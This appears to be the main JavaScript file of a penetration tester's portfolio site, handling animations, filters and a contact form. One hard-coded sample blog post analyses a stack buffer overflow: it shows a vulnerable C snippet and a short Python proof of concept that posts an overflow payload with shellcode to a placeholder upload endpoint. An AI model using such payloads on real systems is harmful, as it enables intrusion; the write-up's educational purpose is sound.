// Premium Cybersecurity Portfolio - Main JavaScript
// Advanced animations, interactions, and professional functionality

document.addEventListener('DOMContentLoaded', function() {
    // Initialize all premium components
    initPremiumNavigation();
    initPremiumScrollReveal();
    initPremiumTypewriter();
    initPremiumSkillsRadar();
    initPremiumProjectFilters();
    initPremiumCVESearch();
    initPremiumBlogSystem();
    initPremiumContactForm();
    initPremiumReadingProgress();
    initPremiumSmoothScrolling();
    initPremiumCardEffects();
    initPremiumStatsAnimation();
    
    // Initialize page-specific features
    const currentPage = getCurrentPage();
    if (currentPage === 'index') {
        initPremiumHeroEffects();
        initPremiumTimelineAnimation();
    } else if (currentPage === 'blog') {
        initPremiumBlogFeatures();
    } else if (currentPage === 'contact') {
        initPremiumContactFeatures();
    }
});

// Get current page
function getCurrentPage() {
    const path = window.location.pathname;
    if (path.includes('blog')) return 'blog';
    if (path.includes('contact')) return 'contact';
    return 'index';
}

// Premium Navigation
function initPremiumNavigation() {
    const mobileMenuBtn = document.getElementById('mobile-menu-btn');
    const mobileMenu = document.getElementById('mobile-menu');
    
    if (mobileMenuBtn && mobileMenu) {
        mobileMenuBtn.addEventListener('click', function() {
            mobileMenu.classList.toggle('hidden');
            
            // Animate mobile menu
            if (!mobileMenu.classList.contains('hidden')) {
                anime({
                    targets: mobileMenu,
                    opacity: [0, 1],
                    translateY: [-20, 0],
                    duration: 300,
                    easing: 'easeOutCubic'
                });
            }
        });
        
        // Close mobile menu when clicking on links
        const mobileLinks = mobileMenu.querySelectorAll('a');
        mobileLinks.forEach(link => {
            link.addEventListener('click', () => {
                mobileMenu.classList.add('hidden');
            });
        });
        
        // Close mobile menu when clicking outside
        document.addEventListener('click', function(e) {
            if (!mobileMenuBtn.contains(e.target) && !mobileMenu.contains(e.target)) {
                mobileMenu.classList.add('hidden');
            }
        });
    }
    
    // Premium nav link hover effects
    const navLinks = document.querySelectorAll('.nav-link-premium');
    navLinks.forEach(link => {
        link.addEventListener('mouseenter', function() {
            anime({
                targets: this,
                scale: 1.05,
                duration: 200,
                easing: 'easeOutCubic'
            });
        });
        
        link.addEventListener('mouseleave', function() {
            anime({
                targets: this,
                scale: 1,
                duration: 200,
                easing: 'easeOutCubic'
            });
        });
    });
}

// Premium Scroll Reveal
function initPremiumScrollReveal() {
    const observerOptions = {
        threshold: 0.15,
        rootMargin: '0px 0px -80px 0px'
    };
    
    const observer = new IntersectionObserver(function(entries) {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('revealed');
                
                // Stagger animation for grid items
                if (entry.target.classList.contains('grid-item')) {
                    const siblings = entry.target.parentElement.querySelectorAll('.grid-item');
                    const index = Array.from(siblings).indexOf(entry.target);
                    
                    anime({
                        targets: entry.target,
                        opacity: [0, 1],
                        translateY: [40, 0],
                        delay: index * 100,
                        duration: 800,
                        easing: 'easeOutCubic'
                    });
                } else {
                    // Standard reveal animation
                    anime({
                        targets: entry.target,
                        opacity: [0, 1],
                        translateY: [40, 0],
                        duration: 800,
                        easing: 'easeOutCubic'
                    });
                }
                
                observer.unobserve(entry.target);
            }
        });
    }, observerOptions);
    
    // Observe all scroll-reveal elements
    document.querySelectorAll('.scroll-reveal-premium').forEach(el => {
        observer.observe(el);
    });
}

// Premium Typewriter Effect
function initPremiumTypewriter() {
    const typedElement = document.getElementById('typed-handle');
    if (typedElement && typeof Typed !== 'undefined') {
        const typed = new Typed('#typed-handle', {
            strings: ['4m3rr0r', '4m3rr0r'],
            typeSpeed: 120,
            backSpeed: 80,
            backDelay: 2500,
            startDelay: 800,
            loop: false,
            showCursor: false,
            onComplete: function() {
                // Add premium glow effect after typing
                typedElement.classList.add('glow-text');
                
                // Add gradient text effect
                setTimeout(() => {
                    typedElement.classList.add('gradient-text');
                }, 500);
            }
        });
    }
}

// Premium Skills Radar
function initPremiumSkillsRadar() {
    const radarContainer = document.getElementById('skills-radar');
    if (radarContainer && typeof echarts !== 'undefined') {
        const chart = echarts.init(radarContainer);
        
        const option = {
            backgroundColor: 'transparent',
            radar: {
                indicator: [
                    { name: 'Penetration Testing', max: 100 },
                    { name: 'Exploit Development', max: 100 },
                    { name: 'Red Teaming', max: 100 },
                    { name: 'Tool Development', max: 100 },
                    { name: 'CVE Research', max: 100 },
                    { name: 'Vulnerability Analysis', max: 100 }
                ],
                shape: 'polygon',
                splitNumber: 5,
                center: ['50%', '50%'],
                radius: '70%',
                axisName: {
                    color: '#00f5ff',
                    fontSize: 14,
                    fontFamily: 'Inter',
                    fontWeight: 'bold'
                },
                splitLine: {
                    lineStyle: {
                        color: 'rgba(0, 245, 255, 0.2)',
                        width: 1
                    }
                },
                splitArea: {
                    show: true,
                    areaStyle: {
                        color: [
                            'rgba(0, 245, 255, 0.05)',
                            'rgba(0, 245, 255, 0.1)',
                            'rgba(0, 245, 255, 0.15)',
                            'rgba(0, 245, 255, 0.2)',
                            'rgba(0, 245, 255, 0.25)'
                        ]
                    }
                },
                axisLine: {
                    lineStyle: {
                        color: 'rgba(0, 245, 255, 0.4)',
                        width: 2
                    }
                }
            },
            series: [{
                name: 'Technical Skills',
                type: 'radar',
                data: [{
                    value: [95, 92, 88, 90, 94, 96],
                    name: 'Current Level',
                    areaStyle: {
                        color: 'rgba(0, 245, 255, 0.3)',
                        opacity: 0.8
                    },
                    lineStyle: {
                        color: '#00f5ff',
                        width: 3,
                        shadowColor: '#00f5ff',
                        shadowBlur: 10
                    },
                    itemStyle: {
                        color: '#00f5ff',
                        borderColor: '#ffffff',
                        borderWidth: 2,
                        shadowColor: '#00f5ff',
                        shadowBlur: 15
                    },
                    emphasis: {
                        itemStyle: {
                            color: '#ffb347',
                            borderColor: '#ffb347',
                            shadowColor: '#ffb347'
                        }
                    }
                }],
                animationDuration: 2500,
                animationEasing: 'cubicOut',
                animationDelay: 500
            }]
        };
        
        chart.setOption(option);
        
        // Resize chart on window resize
        window.addEventListener('resize', () => {
            chart.resize();
        });
        
        // Add hover effects
        chart.on('mouseover', function(params) {
            if (params.componentType === 'series') {
                chart.setOption({
                    series: [{
                        data: [{
                            ...option.series[0].data[0],
                            itemStyle: {
                                color: '#ffb347',
                                borderColor: '#ffb347'
                            }
                        }]
                    }]
                });
            }
        });
        
        chart.on('mouseout', function() {
            chart.setOption(option);
        });
    }
}

// Premium Project Filters
function initPremiumProjectFilters() {
    const filterButtons = document.querySelectorAll('.filter-btn-premium');
    const projectCards = document.querySelectorAll('.card-premium[data-category]');
    
    if (filterButtons.length > 0 && projectCards.length > 0) {
        filterButtons.forEach(button => {
            button.addEventListener('click', function() {
                const filter = this.getAttribute('data-filter');
                
                // Update active button
                filterButtons.forEach(btn => {
                    btn.classList.remove('active');
                    anime({
                        targets: btn,
                        scale: 1,
                        duration: 200,
                        easing: 'easeOutCubic'
                    });
                });
                
                this.classList.add('active');
                anime({
                    targets: this,
                    scale: 1.05,
                    duration: 200,
                    easing: 'easeOutCubic'
                });
                
                // Filter projects with premium animations
                projectCards.forEach((card, index) => {
                    const category = card.getAttribute('data-category');
                    const shouldShow = filter === 'all' || category === filter;
                    
                    if (shouldShow) {
                        card.style.display = 'block';
                        anime({
                            targets: card,
                            opacity: [0, 1],
                            translateY: [30, 0],
                            scale: [0.9, 1],
                            delay: index * 100,
                            duration: 600,
                            easing: 'easeOutCubic'
                        });
                    } else {
                        anime({
                            targets: card,
                            opacity: 0,
                            translateY: -30,
                            scale: 0.9,
                            duration: 400,
                            easing: 'easeInCubic',
                            complete: () => {
                                card.style.display = 'none';
                            }
                        });
                    }
                });
            });
        });
    }
}

// Premium CVE Search
function initPremiumCVESearch() {
    const searchInput = document.getElementById('cve-search');
    const cveCards = document.querySelectorAll('.cve-card-premium');
    
    if (searchInput && cveCards.length > 0) {
        searchInput.addEventListener('input', function() {
            const searchTerm = this.value.toLowerCase();
            
            cveCards.forEach((card, index) => {
                const cveId = card.getAttribute('data-cve').toLowerCase();
                const title = card.querySelector('h3').textContent.toLowerCase();
                const description = card.querySelector('p').textContent.toLowerCase();
                
                const matches = cveId.includes(searchTerm) || 
                               title.includes(searchTerm) || 
                               description.includes(searchTerm);
                
                if (matches || searchTerm === '') {
                    card.style.display = 'block';
                    anime({
                        targets: card,
                        opacity: [0, 1],
                        scale: [0.95, 1],
                        delay: index * 50,
                        duration: 500,
                        easing: 'easeOutCubic'
                    });
                } else {
                    anime({
                        targets: card,
                        opacity: 0,
                        scale: 0.95,
                        duration: 300,
                        easing: 'easeInCubic',
                        complete: () => {
                            card.style.display = 'none';
                        }
                    });
                }
            });
        });
        
        // Add focus effect
        searchInput.addEventListener('focus', function() {
            anime({
                targets: this,
                scale: 1.02,
                duration: 200,
                easing: 'easeOutCubic'
            });
        });
        
        searchInput.addEventListener('blur', function() {
            anime({
                targets: this,
                scale: 1,
                duration: 200,
                easing: 'easeOutCubic'
            });
        });
    }
}

// Premium Blog System
function initPremiumBlogSystem() {
    const categoryTags = document.querySelectorAll('.category-tag-premium');
    const blogCards = document.querySelectorAll('.blog-card-premium');
    const searchInput = document.getElementById('blog-search');
    const modal = document.getElementById('blog-modal');
    const closeModal = document.getElementById('close-modal');
    
    // Category filtering
    if (categoryTags.length > 0 && blogCards.length > 0) {
        categoryTags.forEach(tag => {
            tag.addEventListener('click', function() {
                const category = this.getAttribute('data-category');
                
                // Update active tag with premium animation
                categoryTags.forEach(t => {
                    t.classList.remove('active');
                    anime({
                        targets: t,
                        scale: 1,
                        duration: 200,
                        easing: 'easeOutCubic'
                    });
                });
                
                this.classList.add('active');
                anime({
                    targets: this,
                    scale: 1.1,
                    duration: 200,
                    easing: 'easeOutCubic'
                });
                
                // Filter blog posts
                filterPremiumBlogPosts(category, searchInput ? searchInput.value : '');
            });
        });
    }
    
    // Search functionality
    if (searchInput) {
        searchInput.addEventListener('input', function() {
            const activeCategory = document.querySelector('.category-tag-premium.active')?.getAttribute('data-category') || 'all';
            filterPremiumBlogPosts(activeCategory, this.value);
        });
    }
    
    // Blog post modal functionality
    if (modal && closeModal) {
        closeModal.addEventListener('click', () => {
            closePremiumBlogModal();
        });
        
        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                closePremiumBlogModal();
            }
        });
        
        // Blog post click handlers
        blogCards.forEach(card => {
            const readMoreLink = card.querySelector('a');
            if (readMoreLink) {
                readMoreLink.addEventListener('click', function(e) {
                    e.preventDefault();
                    const slug = card.getAttribute('data-slug');
                    openPremiumBlogPost(slug);
                });
            }
        });
    }
}

// Filter premium blog posts
function filterPremiumBlogPosts(category, searchTerm) {
    const blogCards = document.querySelectorAll('.blog-card-premium');
    const term = searchTerm.toLowerCase();
    
    blogCards.forEach((card, index) => {
        const cardCategory = card.getAttribute('data-category');
        const title = card.querySelector('h2').textContent.toLowerCase();
        const description = card.querySelector('p').textContent.toLowerCase();
        
        const categoryMatch = category === 'all' || cardCategory === category;
        const searchMatch = term === '' || title.includes(term) || description.includes(term);
        
        if (categoryMatch && searchMatch) {
            card.style.display = 'block';
            anime({
                targets: card,
                opacity: [0, 1],
                translateY: [30, 0],
                scale: [0.95, 1],
                delay: index * 80,
                duration: 600,
                easing: 'easeOutCubic'
            });
        } else {
            anime({
                targets: card,
                opacity: 0,
                translateY: -30,
                scale: 0.95,
                duration: 400,
                easing: 'easeInCubic',
                complete: () => {
                    card.style.display = 'none';
                }
            });
        }
    });
}

// Open premium blog post
function openPremiumBlogPost(slug) {
    const modal = document.getElementById('blog-modal');
    const title = document.getElementById('blog-title');
    const content = document.getElementById('blog-content');
    
    // Sample blog post content (in a real implementation, this would be loaded from a file)
    const blogPosts = {
        'cve-2025-7534-analysis': {
            title: 'CVE-2025-7534: Critical Remote Code Execution Analysis',
            content: `
                <div class="mb-8">
                    <div class="flex items-center justify-between mb-6">
                        <span class="px-4 py-2 bg-red-600 bg-opacity-20 text-red-400 text-sm rounded-full border border-red-400 border-opacity-30">CVE Analysis</span>
                        <span class="text-gray-400 text-sm">March 15, 2025 • 15 min read</span>
                    </div>
                    <h1 class="text-4xl font-bold mb-4 text-cyan-400">CVE-2025-7534: Critical Remote Code Execution Analysis</h1>
                    <p class="text-xl text-gray-300 mb-6">Deep technical analysis of a critical buffer overflow vulnerability discovered in a popular enterprise web application.</p>
                </div>
                
                <h2>Executive Summary</h2>
                <p>This blog post provides a detailed analysis of CVE-2025-7534, a critical buffer overflow vulnerability I discovered in a popular web application. The vulnerability allows remote attackers to execute arbitrary code on the target system with system-level privileges.</p>
                
                <h2>Vulnerability Details</h2>
                <p>The vulnerability exists in the input validation mechanism of the application's file upload functionality. Insufficient bounds checking allows an attacker to overflow a fixed-size buffer on the stack.</p>
                
                <pre><code class="language-c">// Vulnerable code snippet
void process_upload(char* filename, char* data) {
    char buffer[256];  // Fixed-size buffer
    strcpy(buffer, filename);  // No bounds checking!
    // ... rest of the function
}</code></pre>
                
                <h2>Exploitation Technique</h2>
                <p>To exploit this vulnerability, an attacker needs to:</p>
                <ol>
                    <li>Craft a malicious filename longer than 256 bytes</li>
                    <li>Include shellcode in the overflow data</li>
                    <li>Overwrite the return address to point to the shellcode</li>
                </ol>
                
                <h2>Proof of Concept</h2>
                <pre><code class="language-python">#!/usr/bin/env python3
import requests

# Exploit payload
payload = b"A" * 256  # Buffer fill
payload += b"B" * 8   # RBP overwrite
payload += b"\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41"  # Return address
payload += b"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05"  # Shellcode

files = {'file': ('exploit.txt', payload)}
response = requests.post('http://target.com/upload', files=files)</code></pre>
                
                <h2>Mitigation</h2>
                <p>The vulnerability can be mitigated by:</p>
                <ul>
                    <li>Using safe string functions like <code>strncpy</code></li>
                    <li>Implementing proper input validation</li>
                    <li>Enabling stack canaries and ASLR</li>
                    <li>Regular security audits and code reviews</li>
                </ul>
                
                <h2>Timeline</h2>
                <ul>
                    <li><strong>Discovery:</strong> January 10, 2025</li>
                    <li><strong>Vendor Notification:</strong> January 15, 2025</li>
                    <li><strong>Patch Released:</strong> March 1, 2025</li>
                    <li><strong>Public Disclosure:</strong> March 15, 2025</li>
                </ul>
                
                <h2>Conclusion</h2>
                <p>This vulnerability highlights the importance of proper input validation and secure coding practices. The critical nature of this vulnerability underscores the need for regular security assessments in web applications.</p>
                
                <div class="mt-12 p-6 bg-gray-800 bg-opacity-50 rounded-xl border border-gray-700">
                    <h3 class="text-xl font-bold mb-4 text-amber-400">About the Author</h3>
                    <p class="text-gray-300">Sheikh Mohammad Hasan (4m3rr0r) is a cybersecurity researcher specializing in vulnerability discovery and exploit development. With 8+ years of experience in the field, he has discovered numerous critical vulnerabilities and contributed to major security tools.</p>
                </div>
            `
        }
    };
    
    const post = blogPosts[slug];
    if (post) {
        title.textContent = post.title;
        content.innerHTML = post.content;
        
        // Trigger syntax highlighting
        if (typeof Prism !== 'undefined') {
            Prism.highlightAllUnder(content);
        }
        
        modal.classList.remove('hidden');
        
        // Animate modal appearance
        anime({
            targets: modal.querySelector('.blog-post-premium'),
            opacity: [0, 1],
            scale: [0.9, 1],
            duration: 500,
            easing: 'easeOutCubic'
        });
        
        // Prevent body scroll
        document.body.style.overflow = 'hidden';
    }
}

// Close premium blog modal
function closePremiumBlogModal() {
    const modal = document.getElementById('blog-modal');
    
    anime({
        targets: modal.querySelector('.blog-post-premium'),
        opacity: 0,
        scale: 0.9,
        duration: 300,
        easing: 'easeInCubic',
        complete: () => {
            modal.classList.add('hidden');
            document.body.style.overflow = 'auto';
        }
    });
}

// Premium Contact Form
function initPremiumContactForm() {
    const form = document.getElementById('contact-form');
    const messagesDiv = document.getElementById('form-messages');
    
    if (form && messagesDiv) {
        // Enhanced form submission handling
        form.addEventListener('submit', function(e) {
            const submitBtn = form.querySelector('.submit-btn-premium');
            const originalText = submitBtn.innerHTML;
            
            // Animate button loading state
            submitBtn.innerHTML = '<span>Sending...</span>';
            submitBtn.disabled = true;
            
            anime({
                targets: submitBtn,
                scale: 0.95,
                duration: 200,
                easing: 'easeOutCubic'
            });
            
            // Simulate form processing (Pageclip handles actual submission)
            setTimeout(() => {
                showPremiumFormMessage('Message sent successfully! I\'ll get back to you within 24 hours.', 'success');
                form.reset();
                
                // Reset button
                submitBtn.innerHTML = originalText;
                submitBtn.disabled = false;
                
                anime({
                    targets: submitBtn,
                    scale: 1,
                    duration: 200,
                    easing: 'easeOutCubic'
                });
            }, 2000);
        });
        
        // Add focus animations to form inputs
        const formInputs = form.querySelectorAll('.form-input-premium');
        formInputs.forEach(input => {
            input.addEventListener('focus', function() {
                anime({
                    targets: this,
                    scale: 1.02,
                    duration: 200,
                    easing: 'easeOutCubic'
                });
            });
            
            input.addEventListener('blur', function() {
                anime({
                    targets: this,
                    scale: 1,
                    duration: 200,
                    easing: 'easeOutCubic'
                });
            });
        });
    }
}

// Show premium form message
function showPremiumFormMessage(message, type) {
    const messagesDiv = document.getElementById('form-messages');
    if (messagesDiv) {
        messagesDiv.innerHTML = `
            <div class="${type}-message-premium p-4 rounded-xl mb-6">
                ${message}
            </div>
        `;
        
        // Animate message appearance
        anime({
            targets: messagesDiv.firstElementChild,
            opacity: [0, 1],
            translateY: [-20, 0],
            duration: 400,
            easing: 'easeOutCubic'
        });
        
        // Auto-hide message after 8 seconds
        setTimeout(() => {
            anime({
                targets: messagesDiv.firstElementChild,
                opacity: 0,
                translateY: -20,
                duration: 300,
                easing: 'easeInCubic',
                complete: () => {
                    messagesDiv.innerHTML = '';
                }
            });
        }, 8000);
    }
}

// Premium Reading Progress
function initPremiumReadingProgress() {
    const progressBar = document.getElementById('reading-progress');
    if (progressBar) {
        window.addEventListener('scroll', () => {
            const scrollTop = window.pageYOffset;
            const docHeight = document.body.offsetHeight - window.innerHeight;
            const scrollPercent = (scrollTop / docHeight) * 100;
            progressBar.style.width = scrollPercent + '%';
        });
    }
    
    // Premium blog reading progress
    const blogProgress = document.getElementById('reading-progress');
    if (blogProgress && getCurrentPage() === 'blog') {
        window.addEventListener('scroll', () => {
            const scrollTop = window.pageYOffset;
            const docHeight = document.body.offsetHeight - window.innerHeight;
            const scrollPercent = (scrollTop / docHeight) * 100;
            blogProgress.style.width = scrollPercent + '%';
        });
    }
}

// Premium Smooth Scrolling
function initPremiumSmoothScrolling() {
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function(e) {
            e.preventDefault();
            const target = document.querySelector(this.getAttribute('href'));
            if (target) {
                const targetPosition = target.offsetTop - 100; // Account for fixed nav
                
                anime({
                    targets: document.documentElement,
                    scrollTop: targetPosition,
                    duration: 1000,
                    easing: 'easeInOutCubic'
                });
            }
        });
    });
}

// Premium Card Effects
function initPremiumCardEffects() {
    const cards = document.querySelectorAll('.card-premium, .cve-card-premium, .blog-card-premium, .contact-info-card-premium, .service-card');
    
    cards.forEach(card => {
        // Mouse enter effect
        card.addEventListener('mouseenter', function() {
            anime({
                targets: this,
                scale: 1.02,
                rotateY: 2,
                rotateX: 2,
                duration: 300,
                easing: 'easeOutCubic'
            });
        });
        
        // Mouse leave effect
        card.addEventListener('mouseleave', function() {
            anime({
                targets: this,
                scale: 1,
                rotateY: 0,
                rotateX: 0,
                duration: 300,
                easing: 'easeOutCubic'
            });
        });
        
        // 3D tilt effect on mouse move
        card.addEventListener('mousemove', function(e) {
            const rect = this.getBoundingClientRect();
            const x = e.clientX - rect.left;
            const y = e.clientY - rect.top;
            const centerX = rect.width / 2;
            const centerY = rect.height / 2;
            const rotateX = (y - centerY) / 10;
            const rotateY = (centerX - x) / 10;
            
            anime({
                targets: this,
                rotateX: rotateX,
                rotateY: rotateY,
                duration: 200,
                easing: 'easeOutCubic'
            });
        });
    });
}

// Premium Stats Animation
function initPremiumStatsAnimation() {
    const statsCards = document.querySelectorAll('.stats-card, .blog-stats');
    
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                const numberElement = entry.target.querySelector('.text-2xl, .text-3xl');
                if (numberElement) {
                    const finalNumber = parseInt(numberElement.textContent.replace(/\D/g, ''));
                    const suffix = numberElement.textContent.replace(/\d/g, '');
                    
                    anime({
                        targets: { value: 0 },
                        value: finalNumber,
                        duration: 2000,
                        easing: 'easeOutCubic',
                        update: function(anim) {
                            numberElement.textContent = Math.round(anim.animatables[0].target.value) + suffix;
                        }
                    });
                }
                observer.unobserve(entry.target);
            }
        });
    }, { threshold: 0.5 });
    
    statsCards.forEach(card => {
        observer.observe(card);
    });
}

// Premium Hero Effects
function initPremiumHeroEffects() {
    // Animate hero elements on load
    const heroContent = document.querySelector('.hero-content');
    if (heroContent) {
        anime.timeline()
            .add({
                targets: heroContent.querySelector('h1'),
                opacity: [0, 1],
                translateY: [50, 0],
                duration: 1000,
                easing: 'easeOutCubic'
            })
            .add({
                targets: heroContent.querySelector('h2'),
                opacity: [0, 1],
                translateY: [30, 0],
                duration: 800,
                easing: 'easeOutCubic'
            }, '-=600')
            .add({
                targets: heroContent.querySelector('p'),
                opacity: [0, 1],
                translateY: [20, 0],
                duration: 600,
                easing: 'easeOutCubic'
            }, '-=400')
            .add({
                targets: heroContent.querySelector('.flex'),
                opacity: [0, 1],
                translateY: [20, 0],
                duration: 600,
                easing: 'easeOutCubic'
            }, '-=200');
    }
}

// Premium Timeline Animation
function initPremiumTimelineAnimation() {
    const timelineItems = document.querySelectorAll('.timeline-item');
    
    const observer = new IntersectionObserver((entries) => {
        entries.forEach((entry, index) => {
            if (entry.isIntersecting) {
                anime({
                    targets: entry.target,
                    opacity: [0, 1],
                    translateX: [-30, 0],
                    delay: index * 200,
                    duration: 800,
                    easing: 'easeOutCubic'
                });
                observer.unobserve(entry.target);
            }
        });
    }, { threshold: 0.3 });
    
    timelineItems.forEach(item => {
        observer.observe(item);
    });
}

// Premium Blog Features
function initPremiumBlogFeatures() {
    // Animate blog grid on load
    const blogGrid = document.getElementById('blog-grid');
    if (blogGrid) {
        const cards = blogGrid.querySelectorAll('.blog-card-premium');
        
        anime({
            targets: cards,
            opacity: [0, 1],
            translateY: [40, 0],
            delay: anime.stagger(150),
            duration: 800,
            easing: 'easeOutCubic'
        });
    }
    
    // Add hover effects to blog cards
    const blogCards = document.querySelectorAll('.blog-card-premium');
    blogCards.forEach(card => {
        card.addEventListener('mouseenter', function() {
            anime({
                targets: this.querySelector('img') || this.querySelector('.text-6xl'),
                scale: 1.1,
                duration: 300,
                easing: 'easeOutCubic'
            });
        });
        
        card.addEventListener('mouseleave', function() {
            anime({
                targets: this.querySelector('img') || this.querySelector('.text-6xl'),
                scale: 1,
                duration: 300,
                easing: 'easeOutCubic'
            });
        });
    });
}

// Premium Contact Features
function initPremiumContactFeatures() {
    // Animate contact form on load
    const contactCard = document.querySelector('.contact-card-premium');
    if (contactCard) {
        anime({
            targets: contactCard,
            opacity: [0, 1],
            translateX: [-50, 0],
            duration: 1000,
            easing: 'easeOutCubic',
            delay: 200
        });
    }
    
    // Animate contact info cards
    const infoCards = document.querySelectorAll('.contact-info-card-premium');
    infoCards.forEach((card, index) => {
        anime({
            targets: card,
            opacity: [0, 1],
            translateX: [50, 0],
            duration: 800,
            easing: 'easeOutCubic',
            delay: 400 + (index * 150)
        });
    });
    
    // Add floating animation to process steps
    const processSteps = document.querySelectorAll('.process-step');
    processSteps.forEach((step, index) => {
        anime({
            targets: step,
            translateY: [0, -5, 0],
            duration: 2000 + (index * 200),
            easing: 'easeInOutSine',
            loop: true,
            delay: index * 300
        });
    });
}

// Utility Functions
function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

function throttle(func, limit) {
    let inThrottle;
    return function() {
        const args = arguments;
        const context = this;
        if (!inThrottle) {
            func.apply(context, args);
            inThrottle = true;
            setTimeout(() => inThrottle = false, limit);
        }
    }
}

// Performance optimizations
const debouncedResize = debounce(() => {
    // Handle resize events
    if (typeof echarts !== 'undefined') {
        const charts = document.querySelectorAll('[id*="radar"]');
        charts.forEach(chart => {
            if (chart._echarts_instance_) {
                chart._echarts_instance_.resize();
            }
        });
    }
}, 250);

window.addEventListener('resize', debouncedResize);

// Error handling
window.addEventListener('error', function(e) {
    console.error('Portfolio Error:', e.error);
});

// Initialize tooltips and other UI enhancements
document.addEventListener('DOMContentLoaded', function() {
    // Add loading states
    document.body.classList.add('loaded');
    
    // Remove loading states after everything is initialized
    setTimeout(() => {
        document.body.classList.remove('loaded');
    }, 1000);
});

// Export functions for external use
window.Portfolio = {
    showFormMessage: showPremiumFormMessage,
    openBlogPost: openPremiumBlogPost,
    closeBlogModal: closePremiumBlogModal,
    filterBlogPosts: filterPremiumBlogPosts
};